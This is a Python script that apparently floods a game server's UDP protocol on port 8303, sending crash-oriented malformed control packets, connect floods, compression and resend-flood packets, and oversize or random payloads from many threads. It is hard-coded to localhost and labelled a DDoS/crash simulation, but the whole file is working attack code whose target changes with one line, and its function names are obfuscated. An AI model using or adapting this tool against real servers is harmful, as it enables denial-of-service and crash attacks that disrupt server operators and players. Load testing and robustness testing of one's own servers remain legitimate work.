import socket
import os
import sys
import time
import random
import struct
import threading

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8303

SERVERBROWSE_GETINFO = bytes([255, 255, 255, 255, ord('g'), ord('i'), ord('e'), ord('3')])
SERVERBROWSE_GETINFO_64_LEGACY = bytes([255, 255, 255, 255, ord('f'), ord('s'), ord('t'), ord('d')])
NET_HEADER_EXTENDED = b"xe"

NET_PACKETFLAG_CONTROL = 1 << 2
NET_PACKETFLAG_CONNLESS = 1 << 3
NET_PACKETFLAG_RESEND = 1 << 4
NET_PACKETFLAG_COMPRESSION = 1 << 5

NET_CTRLMSG_CONNECT = 1
NET_CTRLMSG_KEEPALIVE = 0
NET_CTRLMSG_CLOSE = 4

SECURITY_TOKEN_MAGIC = b"TKEN"

C_RESET = "\033[0m"
C_RED = "\033[91m"
C_YEL = "\033[93m"
C_CYN = "\033[96m"
C_GRN = "\033[92m"
C_MAG = "\033[95m"
C_GRY = "\033[90m"

stats_lock = threading.Lock()
stats = {}
running = True


def by_utf8xbot_7413():
    a = random.randint(1, 254)
    b = random.randint(0, 255)
    c = random.randint(0, 255)
    d = random.randint(1, 254)
    return "%d.%d.%d.%d" % (a, b, c, d)


def by_utf8xbot_2856(sock, payload, fake_ip, kind):
    try:
        sock.sendto(payload, (TARGET_HOST, TARGET_PORT))
    except Exception:
        return
    with stats_lock:
        stats[kind] = stats.get(kind, 0) + 1
    color = {
        "getinfo": C_CYN,
        "getinfo64": C_MAG,
        "extended": C_YEL,
        "connect_flood": C_GRN,
        "crash_malformed": C_RED,
        "huffman_bomb": C_RED,
        "resend_flood": C_YEL,
        "random_garbage": C_GRY,
        "oversize": C_RED,
    }.get(kind, C_RESET)
    print("%s[SRC %-15s]%s %-16s -> %s:%d  (%d B)%s" % (
        color, fake_ip, C_RESET, kind, TARGET_HOST, TARGET_PORT, len(payload), C_RESET))
    sys.stdout.flush()


def by_utf8xbot_9021():
    tok = random.randint(0, 255)
    return SERVERBROWSE_GETINFO + bytes([tok])


def by_utf8xbot_3390():
    tok = random.randint(0, 255)
    return SERVERBROWSE_GETINFO_64_LEGACY + bytes([tok])


def by_utf8xbot_5148():
    extra = bytes([random.randint(0, 255) for _ in range(4)])
    tok = random.randint(0, 255)
    return NET_HEADER_EXTENDED + extra + SERVERBROWSE_GETINFO + bytes([tok])


def by_utf8xbot_6672():
    hdr = bytes([(NET_PACKETFLAG_CONTROL << 2) & 0xfc, 0, 0])
    body = bytes([NET_CTRLMSG_CONNECT]) + SECURITY_TOKEN_MAGIC
    return hdr + body


def by_utf8xbot_4405():
    choice = random.randint(0, 5)
    if choice == 0:
        return bytes([(NET_PACKETFLAG_CONTROL << 2) & 0xfc, 0, 0])
    if choice == 1:
        return bytes([(NET_PACKETFLAG_CONTROL << 2) & 0xfc, 0, 0, 99])
    if choice == 2:
        return bytes([0xfc, 0xff, 0xff]) + os.urandom(2)
    if choice == 3:
        return bytes([(NET_PACKETFLAG_CONNLESS << 2) & 0xfc])
    if choice == 4:
        flags = (NET_PACKETFLAG_COMPRESSION << 2) & 0xfc
        return bytes([flags, 0, 1]) + os.urandom(1)
    return bytes([(NET_PACKETFLAG_CONTROL << 2) & 0xfc, 0, 0, NET_CTRLMSG_CLOSE]) + os.urandom(300)


def by_utf8xbot_7789():
    flags = (NET_PACKETFLAG_COMPRESSION << 2) & 0xfc
    payload = bytes([random.randint(0, 15)]) * random.randint(20, 60)
    return bytes([flags, 0, 1]) + payload


def by_utf8xbot_1163():
    flags = (NET_PACKETFLAG_RESEND << 2) & 0xfc
    num_chunks = 0xff
    return bytes([flags, 0, num_chunks]) + os.urandom(random.randint(4, 40))


def by_utf8xbot_9954():
    return os.urandom(random.randint(1, 40))


def by_utf8xbot_2201():
    return os.urandom(random.randint(1200, 1400))


PACKET_BUILDERS = [
    ("getinfo", by_utf8xbot_9021, 30),
    ("getinfo64", by_utf8xbot_3390, 15),
    ("extended", by_utf8xbot_5148, 15),
    ("connect_flood", by_utf8xbot_6672, 15),
    ("crash_malformed", by_utf8xbot_4405, 8),
    ("huffman_bomb", by_utf8xbot_7789, 6),
    ("resend_flood", by_utf8xbot_1163, 5),
    ("random_garbage", by_utf8xbot_9954, 4),
    ("oversize", by_utf8xbot_2201, 2),
]

WEIGHTED = []
for name, fn, w in PACKET_BUILDERS:
    WEIGHTED.extend([(name, fn)] * w)


def by_utf8xbot_8830(thread_id, pps):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("127.0.0.1", 0))
    except Exception:
        pass
    delay = 1.0 / pps if pps > 0 else 0
    while running:
        fake_ip = by_utf8xbot_7413()
        name, fn = random.choice(WEIGHTED)
        payload = fn()
        by_utf8xbot_2856(sock, payload, fake_ip, name)
        if delay:
            time.sleep(delay)
    sock.close()


def by_utf8xbot_4127():
    while running:
        time.sleep(2)
        with stats_lock:
            total = sum(stats.values())
            snap = dict(stats)
        print("%s================ STATS: %d packets total ================%s" % (C_GRN, total, C_RESET))
        for k in sorted(snap.keys()):
            print("%s  %-16s %d%s" % (C_GRN, k, snap[k], C_RESET))
        print("%s=========================================================%s" % (C_GRN, C_RESET))
        sys.stdout.flush()


def main():
    global running
    threads = int(sys.argv[1]) if len(sys.argv) > 1 else 8
    pps = int(sys.argv[2]) if len(sys.argv) > 2 else 40
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 0

    print("%s#############################################################%s" % (C_RED, C_RESET))
    print("%s#   ATTACK CONSOLE  -  DDoS/CRASH SIMULATION (localhost)     #%s" % (C_RED, C_RESET))
    print("%s#   target %s:%-5d  threads=%d  pps/thread=%d              #%s" % (C_RED, TARGET_HOST, TARGET_PORT, threads, pps, C_RESET))
    print("%s#############################################################%s" % (C_RED, C_RESET))
    print("%s   emulating %d spoofed source IPs, mixed packet types%s" % (C_YEL, threads, C_RESET))
    sys.stdout.flush()

    workers = []
    for i in range(threads):
        t = threading.Thread(target=by_utf8xbot_8830, args=(i, pps), daemon=True)
        t.start()
        workers.append(t)

    st = threading.Thread(target=by_utf8xbot_4127, daemon=True)
    st.start()

    try:
        if duration > 0:
            time.sleep(duration)
            running = False
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        running = False

    time.sleep(0.5)
    with stats_lock:
        total = sum(stats.values())
    print("%s[STOP] attack finished, %d packets sent%s" % (C_RED, total, C_RESET))


if __name__ == "__main__":
    main()
